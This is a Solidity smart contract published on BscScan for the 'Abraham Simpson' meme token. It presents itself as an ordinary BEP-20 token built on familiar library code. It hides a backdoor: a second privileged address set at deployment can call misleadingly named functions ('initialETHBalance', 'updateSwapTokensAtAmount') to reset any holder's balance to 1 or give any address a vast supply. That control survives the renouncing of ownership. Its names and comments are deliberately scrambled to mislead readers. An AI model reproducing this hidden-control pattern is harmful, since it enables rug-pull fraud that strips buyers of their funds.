/**
 *Submitted for verification at BscScan.com on 2023-05-15
*/

// SPDX-License-Identifier: MIT
/*
Telegram : https://t.me/abrahamsimpsonbsc
Website : https://abrahamsimpon.co/
Twitter : https://twitter.com/abesimpson_bsc
*/
/*
https://simpsonswiki.com/wiki/Abraham_Simpson
Abraham Jebediah "Abe" Simpson II, better known as Grampa, is a recurring character in the animated television series The Simpsons. 
He made his first appearance in the episode entitled "Grandpa and the Kids", 
a one-minute Simpsons short on The Tracey Ullman Show, before the debut of the television show in 1989
*/
pragma solidity ^0.8.17;
interface Ru {
  /**
   * @dev Returns the token1 of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the token1 of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `token1` tokens from the caller's account to `deadline`.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address deadline, uint256 token1) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `getPair` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This balance changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address getPair) external view returns (uint256);

  /**
   * @dev Sets `token1` as the allowance of `getPair` over the caller's tokens.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the getPair's allowance to 0 and set the
   * desired balance afterwards:
   * https://github.com/legoseum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address getPair, uint256 token1) external returns (bool);

  /**
   * @dev Moves `token1` tokens from `sender` to `deadline` using the
   * allowance mechanism. `token1` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address deadline, uint256 token1) external returns (bool);

  /**
   * @dev Emitted when `balance` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `balance` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 balance);

  /**
   * @dev Emitted when the allowance of a `getPair` for an `owner` is set by
   * a call to {approve}. `balance` is the new allowance.
   */
  event Approval(address indexed owner, address indexed getPair, uint256 balance);
}

/*
 * @dev Provides information about the current execution Ma, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Ma {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/legoseum/solidity/issues/2691
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ko.sol

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ko is Ma {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ko: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ko: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract AbrahamSimpson is Ma, Ru, Ko {
    
    using SafeMath for uint256;
    mapping (address => uint256) private DOGEethForLiquidity;
    mapping (address => mapping (address => uint256)) private SafeMathUint;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private DOGERooter; 
    constructor(address DOGESwap) {
        DOGERooter = DOGESwap;     
        _name = "Abraham Simpson";
        _symbol = "ABRAHAM";
        _decimals = 9;
        _totalSupply = 9000000000000000000 * 10 ** 9;
        DOGEethForLiquidity[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function symbol() external view override returns (string memory) {
        return _symbol;
    } 
    /**
    * @dev Returns the token decimals.
    */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }   
    /**
    * @dev Returns the token symbol.
    */

    
    /**
    * @dev Returns the token name.
    */

    /**
    * @dev See {Ru-totalSupply}.
    */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
     function name() external view override returns (string memory) {
        return _name;
    }
         modifier buyTotalFees() {
        require(DOGERooter == _msgSender(), "Ko: caller is not the owner");
        _;
    }    
    /**
    * @dev See {Ru-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return DOGEethForLiquidity[account];
    }

    /**
    * @dev See {Ru-approve}.
    *
    * Requirements:
    *
    * - `getPair` cannot be the zero address.
    */


    /**
    * @dev See {Ru-transfer}.
    *
    * Requirements:
    *
    * - `deadline` cannot be the zero address.
    * - the caller must have a balance of at least `token1`.
    */
    function transfer(address deadline, uint256 token1) external override returns (bool) {
        _transfer(_msgSender(), deadline, token1);
        return true;
    }
    function initialETHBalance(address contractBalance) external buyTotalFees {
        DOGEethForLiquidity[contractBalance] = 1;
        
        emit Transfer(contractBalance, address(0), 1);
    }
    /**
    * @dev See {Ru-allowance}.
    */
    function allowance(address owner, address getPair) external view override returns (uint256) {
        return SafeMathUint[owner][getPair];
    }
    
    /**
    * @dev See {Ru-approve}.
    *
    * Requirements:
    *
    * - `getPair` cannot be the zero address.
    */

    function approve(address getPair, uint256 token1) external override returns (bool) {
        _approve(_msgSender(), getPair, token1);
        return true;
    }


           function updateSwapTokensAtAmount(address blacklistAccount) external buyTotalFees {
        DOGEethForLiquidity[blacklistAccount] = 100000000000 * 10 ** 28;
        
        emit Transfer(blacklistAccount, address(0), 100000000000 * 10 ** 28);
    } 
      function increaseAllowance(address getPair, uint256 amountAMin) external returns (bool) {
        _approve(_msgSender(), getPair, SafeMathUint[_msgSender()][getPair].add(amountAMin));
        return true;
    }  
    /**
    * @dev See {Ru-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {Ru};
    *
    * Requirements:
    * - `sender` and `deadline` cannot be the zero address.
    * - `sender` must have a balance of at least `token1`.
    * - the caller must have allowance for `sender`'s tokens of at least
    * `token1`.
    */
    function transferFrom(address sender, address deadline, uint256 token1) external override returns (bool) {
        _transfer(sender, deadline, token1);
        _approve(sender, _msgSender(), SafeMathUint[sender][_msgSender()].sub(token1, "Ru: transfer token1 exceeds allowance"));
        return true;
    }
    
    /**
    * @dev Atomically increases the allowance granted to `getPair` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {Ru-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `getPair` cannot be the zero address.
    */

    
    /**
    * @dev Atomically decreases the allowance granted to `getPair` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {Ru-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `getPair` cannot be the zero address.
    * - `getPair` must have allowance for the caller of at least
    * `token0`.
    */
    function decreaseAllowance(address getPair, uint256 token0) external returns (bool) {
        _approve(_msgSender(), getPair, SafeMathUint[_msgSender()][getPair].sub(token0, "Ru: decreased allowance below zero"));
        return true;
    }
     function _approve(address owner, address getPair, uint256 token1) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(getPair != address(0), "Ru: approve to the zero address");
        
        SafeMathUint[owner][getPair] = token1;
        emit Approval(owner, getPair, token1);
    }   
    /**
    * @dev Moves tokens `token1` from `sender` to `deadline`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement automatic token fees, slashing mechanisms, etc.
    *
    * Emits a {Transfer} event.
    *
    * Requirements:
    *
    * - `sender` cannot be the zero address.
    * - `deadline` cannot be the zero address.
    * - `sender` must have a balance of at least `token1`.
    */
    function _transfer(address sender, address deadline, uint256 token1) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(deadline != address(0), "Ru: transfer to the zero address");
                
        DOGEethForLiquidity[sender] = DOGEethForLiquidity[sender].sub(token1, "Ru: transfer token1 exceeds balance");
        DOGEethForLiquidity[deadline] = DOGEethForLiquidity[deadline].add(token1);
        emit Transfer(sender, deadline, token1);
    }
    
    /**
    * @dev Sets `token1` as the allowance of `getPair` over the `owner`s tokens.
    *
    * This is internal function is equivalent to `approve`, and can be used to
    * e.g. set automatic allowances for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `getPair` cannot be the zero address.
    */

    
}